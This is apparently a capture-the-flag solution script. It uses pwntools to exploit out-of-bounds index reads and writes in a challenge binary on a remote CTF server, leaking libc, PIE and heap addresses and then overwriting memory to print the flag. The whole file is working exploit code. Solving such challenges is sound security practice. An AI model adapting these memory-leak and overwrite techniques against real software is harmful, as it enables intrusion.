from pwn import *

context.binary = binary = ELF('./index-2', checksec=False)
libc = ELF('./libc.so.6', checksec=False)

def r(idx):
	p.sendlineafter(b'Exit\n', b'2')
	p.sendlineafter(b'Index: ', str(idx).encode())
	p.recvuntil(b'Data: ')
	return p.recvuntil(b'1.')[:-2]

def w(idx, data):
	assert(len(data)) <= 8
	p.sendlineafter(b'Exit\n', b'1')
	p.sendlineafter(b'Index: ', str(idx).encode())
	p.sendlineafter(b'Data: ', data)

#p = process()
p = remote('play.scriptsorcerers.xyz', 10034)

libc_leak = u64(r(-4).ljust(8, b'\x00'))
libc.address = libc_leak - libc.symbols._IO_2_1_stderr_
print(f'libc leak @ {hex(libc_leak)}')
print(f'libc base @ {hex(libc.address)}')

pie_leak = u64(r(-11).ljust(8, b'\x00'))
binary.address = pie_leak - 0x4008
print(f'pie leak @ {hex(pie_leak)}')
print(f'pie base @ {hex(binary.address)}')

p.sendlineafter(b'Exit\n', b'1337')
heap_leak = u64(r(8).ljust(8, b'\x00'))
heap_base = heap_leak &~ 0xfff
print(f'f @ {hex(heap_leak)}')
print(f'heap base @ {hex(heap_base)}')

w(-6, p64(heap_leak))
p.recvuntil(b'Invalid choice: ')
print(p.recvline().decode())